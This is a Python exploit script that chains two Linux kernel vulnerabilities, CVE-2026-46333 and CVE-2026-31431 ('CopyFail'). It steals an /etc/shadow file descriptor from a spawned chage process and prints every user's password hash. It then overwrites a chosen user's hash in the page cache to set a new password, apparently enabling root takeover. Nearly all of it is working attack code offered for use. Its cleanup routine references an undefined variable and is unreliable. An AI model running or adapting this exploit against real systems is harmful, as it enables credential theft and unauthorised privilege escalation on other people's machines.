import ctypes
import errno
import getpass
import os
import socket
import struct
import sys
from ctypes.util import find_library

# Constants for CopyFail
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_OP_DECRYPT = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1
ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"

# As of writing this, Python does not
# have os.pidfd_getfd
# It was proposed 11 days ago.
# https://github.com/python/cpython/issues/149464
# https://discuss.python.org/t/pidfd-getfd-syscall/107203
# We were so close...

libc_path = find_library("c")
libc = ctypes.CDLL(libc_path)

# We also need to use the crypt function to hash our new password
libcrypt_path = find_library("crypt")
libcrypt = ctypes.CDLL(libcrypt_path)
# Define argument types as per https://man7.org/linux/man-pages/man3/crypt.3.html
# This will take and return Python bytes objects
libcrypt.crypt.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
libcrypt.crypt.restype = ctypes.c_char_p


# CVE-2026-46333
# Exploit logic from: https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn
# Translation to Python by me
# Gives us a copy of the file descriptor for /etc/shadow
# This is obtained by calling 'chage', which opens the file
# and then making a copy of the fd for ourselves. More info
# available on original GitHub repo
def get_shadow_fd() -> int:
    """Get a file descriptor for /etc/shadow

    Uses CVE-2026-46333 to open the shadow file. Will spawn chage to
    steal this handle up to 500 times, trying 30000 times for each to
    copy the file descriptor to this process and return it."""
    for _ in range(500):
        # Fork to create a child
        # This will just exec chage
        chage_pid: int = os.fork()
        if chage_pid == 0:
            devnull = os.open("/dev/null", os.O_RDWR)
            # Set stdout and stderr to /dev/null
            os.dup2(devnull, 1)
            os.dup2(devnull, 2)
            os.execl("/usr/bin/chage", "chage", "-l", "root")
            # Process call failed
            sys.exit(127)
        pfd: int = os.pidfd_open(chage_pid, 0)
        # If we got an error, just wait until chage is done
        # then start a new attempt
        if pfd < 0:
            os.waitpid(chage_pid, 0)
            continue

        for _ in range(30000):
            for chage_fd in range(3, 32):
                fd_copy: int = libc.pidfd_getfd(pfd, chage_fd, 0)
                # pidfd_getfd errored, try again
                if fd_copy < 0:
                    continue
                # Find out which file this leads to
                file: str = os.readlink("/proc/self/fd/" + str(fd_copy))
                if file == "/etc/shadow":
                    # Seek back to the start of the file for
                    # easier reading
                    os.lseek(fd_copy, 0, os.SEEK_SET)
                    return fd_copy
                # Close the file if not shadow, stops us opening too many files
                # for the OS to handle
                os.close(fd_copy)
    print("CVE-2026-46333 failure: Could not get /etc/shadow fd.")
    sys.exit(1)


# CVE-2026-31431 / CopyFail
# I've covered this one a bit recently
# Exploit code from: https://github.com/rootsecdev/cve_2026_31431
# Slightly modified by me, mostly to accept a file descriptor rather
# than a path
# Writeup available here: https://xint.io/blog/copy-fail-linux-distributions
def write_four_bytes(fd_target: int, file_offset: int, four_bytes: bytes) -> None:
    """Overwrite 4 bytes of fd_target's page cache at file_offset.

    The bytes are placed in AAD seqno_lo (bytes 4..7); authencesn's
    scratch-write copies them into the spliced page-cache page at the
    file offset we splice from.
    """

    if len(four_bytes) != 4:
        raise ValueError("Must write exactly four bytes at a time.")

    def authenc_keyblob(authkey: bytes, enckey: bytes) -> bytes:
        rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
        keyparam = struct.pack(">I", len(enckey))
        return rtattr + keyparam + authkey + enckey

    # I've removed the read for the page cache
    # We already read the file in 4096-byte chunks so it will be cached by here

    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    master.bind(("aead", ALG_NAME))
    master.setsockopt(SOL_ALG, ALG_SET_KEY, authenc_keyblob(b"\x00" * 32, b"\x00" * 16))
    op, _ = master.accept()
    try:
        aad = b"\x00" * 4 + four_bytes  # SPI || seqno_lo
        cmsg = [
            (SOL_ALG, ALG_SET_OP, struct.pack("I", ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, struct.pack("I", 16) + b"\x00" * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", 8)),
        ]
        op.sendmsg([aad], cmsg, socket.MSG_MORE)

        pr, pw = os.pipe()
        try:
            n = os.splice(fd_target, pw, 32, offset_src=file_offset)
            if n != 32:
                raise RuntimeError(f"splice file->pipe short: {n}")
            n = os.splice(pr, op.fileno(), n)
            if n != 32:
                raise RuntimeError(f"splice pipe->op short: {n}")
        finally:
            os.close(pr)
            os.close(pw)

        try:
            op.recv(64)
        except OSError as e:
            if e.errno not in (errno.EBADMSG, errno.EINVAL):
                raise
    finally:
        op.close()
        master.close()


def get_users_and_offsets(shadow_data: bytes) -> dict[str, tuple[bytes, int]]:
    """Read usernames with passwords from the shadow file.

    Reads through a bytes object containing the shadow file, noting usernames
    that have passwords set. The password hashes of these are read, plus data
    after these such that len(password) % 4 == 0 for usage with CopyFail. The
    offset of the password in the file is added alongside this to the
    dictionary. We assume the shadow file has a valid format.
    """
    # We should have read the file in chunks already
    # No point reading byte by byte, having it in memory is faster
    # We are also making the assumption the file has a valid structure
    summary: dict[str, tuple[bytes, int]] = {}
    raw_username: bytes = b""
    raw_password: bytes = b""
    password_offset: int = -1
    # 0 = username
    # 1 = password
    # 2 = password padding
    # 3 = wait for newline
    stage: int = 0
    for i in range(len(shadow_data)):
        # Read like this because shadow_data[i] is an int
        char: bytes = shadow_data[i : i + 1]
        if stage == 0:
            if char == b":":
                # This would indicate the user does not have a password
                if shadow_data[i + 1 : i + 2] in b"!*":
                    stage = 3
                    continue
                stage = 1
                password_offset = i + 1
                continue
            raw_username += char
        elif stage == 1:
            if char == b":":
                if len(raw_password) % 4 == 0:
                    stage = 3
                    continue
                else:
                    stage = 2
            raw_password += char
        elif stage == 2:
            raw_password += char
            if len(raw_password) % 4 == 0:
                stage = 3
        elif stage == 3:
            if char == b"\n":
                if password_offset > 0:
                    summary[raw_username.decode()] = (raw_password, password_offset)
                raw_username = b""
                raw_password = b""
                password_offset = -1
                stage = 0

    return summary


def print_usage(shadow_summary: dict[str, tuple[bytes, int]]) -> None:
    print("Summary of login users in /etc/shadow:")
    for user in shadow_summary:
        passhash: str = shadow_summary[user][0].decode().split(":", 1)[0]
        print(f"  {user}: {passhash}")

    print("\nPlease specify a user to temporarily change their password.")
    print(f"Usage:\n  {sys.executable} {sys.argv[0]} <user>")


# This is also largely from https://github.com/rootsecdev/cve_2026_31431
def copfail_cleanup():
    # evict the corrupted page so the rest of the system stops
    # seeing a broken UID->name mapping. Any user can request
    # POSIX_FADV_DONTNEED on a file they can read.
    fd = os.open(PASSWD, os.O_RDONLY)
    try:
        os.posix_fadvise(fd, 0, 0, os.POSIX_FADV_DONTNEED)
    finally:
        os.close(fd)
    print(f"Cleanup: /etc/shadow page cache evicted, original password restored.")


if __name__ == "__main__":
    shadow_fd: int = get_shadow_fd()
    shadow_file: bytes = b""
    while True:
        new_data: bytes = os.read(shadow_fd, 4096)
        if len(new_data) < 1:
            break
        shadow_file += new_data

    shadow_summary: dict[str, tuple[bytes, int]] = get_users_and_offsets(shadow_file)

    if len(sys.argv) < 2:
        print_usage(shadow_summary)
        sys.exit(0)

    user: str = sys.argv[1]
    if user not in shadow_summary:
        print(f"Error: '{user}' does not have a password saved:\n")
        print_usage(shadow_summary)
        sys.exit(1)

    password: str = getpass.getpass("New password: ")
    if password != getpass.getpass("Verify password: "):
        print("Passwords did not match.")
        sys.exit(1)
    if password == "":
        print("Password is blank. May work but be cautious.")

    # Now the difficult part is making sure the new hash is
    # the same length as the old one
    # We do this mainly by reusing the same salt (main cause
    # of variation) and then basically hoping. Generally the
    # same salt/parameters will produce a password of the
    # same length, but if not we'd have to support a lot of
    # hashing algorithms to debug it when realistically the
    # user can probably just pick a slightly varied password.

    # Get shadow entry and data we need from it
    # We need the old hash for its salt and length
    # and the padding to 4 bytes for CopyFail
    shadow_entry: tuple[bytes, int] = shadow_summary[user]
    old_hash: bytes
    padding: bytes
    if b":" in shadow_entry[0]:
        old_hash, padding = shadow_entry[0].split(b":", 1)
        padding = b":" + padding
    else:
        old_hash = shadow_entry[0]
        padding = b""
    hash_length: int = len(old_hash)

    # Search backwards for last '$', which marks
    # the end of the last part of the salt/config
    last_sep: int = old_hash.rfind(b"$")
    if last_sep == -1:
        print(f"Existing hash malformed: '{old_hash.decode()}'.")
        sys.exit(1)
    # Get the salt to reuse for the new password.
    salt: bytes = old_hash[:last_sep]
    password_bytes: bytes = password.encode()

    new_hash: bytes = libcrypt.crypt(password_bytes, salt)
    if len(new_hash) != len(old_hash):
        print("The new password hash is a different length to the old one.")
        print("This should be rare but can happen depending on the algorithm")
        print("used. Please try a different password.")
        sys.exit(1)

    # Prepare our CopyFail payload, new hash and padding
    copyfail_payload: bytes = new_hash + padding
    # Get the password offset, where we start the write
    base_offset: int = shadow_entry[1]
    # Loop over the password, using CopyFail to write 4 bytes
    # at a time.
    for write_offset in range(0, len(copyfail_payload), 4):
        part: bytes = copyfail_payload[write_offset : write_offset + 4]
        try:
            write_four_bytes(shadow_fd, base_offset + write_offset, part)
        except Exception as e:
            print(f"CVE-2026-31431 / CopyFail failure: {e}")
            print("Cleaning up page cache...")
            copfail_cleanup()
            sys.exit(1)

    print("Successfully wrote new password!")
    print("Please note:")
    print(" - This will reset on reboot or page cache clear")
    print(" - The salt from your old password is reused")
    print(
        "It is recommended to set your password again via the passwd command to resolve these issues."
    )
